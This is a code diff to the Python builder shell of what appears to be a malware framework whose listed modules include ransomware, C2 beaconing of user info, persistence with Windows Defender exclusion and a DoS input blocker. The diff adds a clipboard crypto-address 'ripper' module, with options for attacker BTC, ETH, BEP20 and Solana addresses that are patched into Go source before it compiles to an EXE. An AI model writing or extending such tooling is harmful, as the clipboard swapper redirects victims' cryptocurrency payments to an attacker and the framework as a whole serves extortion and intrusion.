@@ -17,6 +17,7 @@ MODULES = {
     'interfaceplug/suicide': {'desc': 'Block input (DoS)'},
     'quickhack/ping': {'desc': 'Sends back user info to the C2 server'},
     'quickhack/icepick': {'desc': 'Adds EXE to persistence and adds exclusion to Windows Defender'},
+    'interfaceplug/ripper': {'desc': 'Clipboard wallet address ripper'},
 }
 
 MODULE_CHAIN = []
@@ -39,6 +40,12 @@ MODULE_OPTIONS = {
     },
     'daemon/bartmoss': {
         'NOTE': 'Your ransom note here',
+    },
+    'interfaceplug/ripper': {
+        'BTC_ADDRESS': '1BitcoinPredefinedAddressExample1234',
+        'ETH_ADDRESS': '0xEthereumPredefinedAddress1234567890abcdef',
+        'BEP20_ADDRESS': '0xBEP20PredefinedAddress1234567890abcdef',
+        'SOL_ADDRESS': 'So1anaPredefinedAddressExample1234567890',
     },
 }
 
@@ -206,6 +213,29 @@ def patch_filedaemon_env(target_ip, target_port):
 def restore_filedaemon_go(original_lines):
     pass
 
+def patch_ripper_addresses(btc, eth, bep20, sol):
+    go_path = os.path.join('INTERFACEPLUGS', 'ripper.go')
+    with open(go_path, 'r') as f:
+        lines = f.readlines()
+    with open(go_path, 'w') as f:
+        for line in lines:
+            if line.strip().startswith('predefinedBitcoinAddress'):
+                f.write(f'\tpredefinedBitcoinAddress  = "{btc}"\n')
+            elif line.strip().startswith('predefinedEthereumAddress'):
+                f.write(f'\tpredefinedEthereumAddress = "{eth}"\n')
+            elif line.strip().startswith('predefinedBEP20Address'):
+                f.write(f'\tpredefinedBEP20Address    = "{bep20}"\n')
+            elif line.strip().startswith('predefinedSolanaAddress'):
+                f.write(f'\tpredefinedSolanaAddress   = "{sol}"\n')
+            else:
+                f.write(line)
+    return lines
+
+def restore_ripper_go(original_lines):
+    go_path = os.path.join('INTERFACEPLUGS', 'ripper.go')
+    with open(go_path, 'w') as f:
+        f.writelines(original_lines)
+
 def shell():
     current_module = None
     readline.set_completer(shell_completer)
@@ -254,6 +284,7 @@ def shell():
                         bartmoss_original = None
                         spider_original = None
                         filedaemon_original = None
+                        ripper_original = None
                         
                         if modname == 'daemon/bartmoss':
                             note = MODULE_OPTIONS.get('daemon/bartmoss', {}).get('NOTE', 'YOUR NOTE HERE')
@@ -274,6 +305,13 @@ def shell():
                             target_ip = opts.get('TARGET_IP', '127.0.0.1')
                             target_port = opts.get('TARGET_PORT', '9000')
                             filedaemon_original = patch_filedaemon_env(target_ip, target_port)
+                        elif modname == 'interfaceplug/ripper':
+                            opts = MODULE_OPTIONS.get('interfaceplug/ripper', {})
+                            btc = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
+                            eth = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
+                            bep20 = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
+                            sol = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
+                            ripper_original = patch_ripper_addresses(btc, eth, bep20, sol)
                         
                         module_name = modname.split('/')[-1]
                         final_name = f"{module_name}.exe"
@@ -299,6 +337,8 @@ def shell():
                             restore_spider_go(spider_original)
                         if filedaemon_original:
                             restore_filedaemon_go(filedaemon_original)
+                        if ripper_original:
+                            restore_ripper_go(ripper_original)
                         
                         MODULE_CHAIN.clear()
                     else:
@@ -307,6 +347,7 @@ def shell():
                         bartmoss_original = None
                         spider_original = None
                         filedaemon_original = None
+                        ripper_original = None
                         for modname in MODULE_CHAIN:
                             go_path = modname.replace('daemon/', 'DAEMONS/').replace('quickhack/', 'QUICKHACKS/').replace('interfaceplug/', 'INTERFACEPLUGS/') + '.go'
                             if modname == 'daemon/bartmoss':
@@ -328,6 +369,13 @@ def shell():
                                 target_ip = opts.get('TARGET_IP', '127.0.0.1')
                                 target_port = opts.get('TARGET_PORT', '9000')
                                 filedaemon_original = patch_filedaemon_env(target_ip, target_port)
+                            if modname == 'interfaceplug/ripper':
+                                opts = MODULE_OPTIONS.get('interfaceplug/ripper', {})
+                                btc = opts.get('BTC_ADDRESS', '1BitcoinPredefinedAddressExample1234')
+                                eth = opts.get('ETH_ADDRESS', '0xEthereumPredefinedAddress1234567890abcdef')
+                                bep20 = opts.get('BEP20_ADDRESS', '0xBEP20PredefinedAddress1234567890abcdef')
+                                sol = opts.get('SOL_ADDRESS', 'So1anaPredefinedAddressExample1234567890')
+                                ripper_original = patch_ripper_addresses(btc, eth, bep20, sol)
                             go_paths.append(go_path)
                         final_name = BUILD_OPTIONS['exe_name']
                         final_path = os.path.abspath(os.path.join(loot_dir, final_name))
@@ -348,6 +396,8 @@ def shell():
                             restore_spider_go(spider_original)
                         if filedaemon_original:
                             restore_filedaemon_go(filedaemon_original)
+                        if ripper_original:
+                            restore_ripper_go(ripper_original)
                         MODULE_CHAIN.clear()
             elif cmd == 'clear':
                 MODULE_CHAIN.clear()
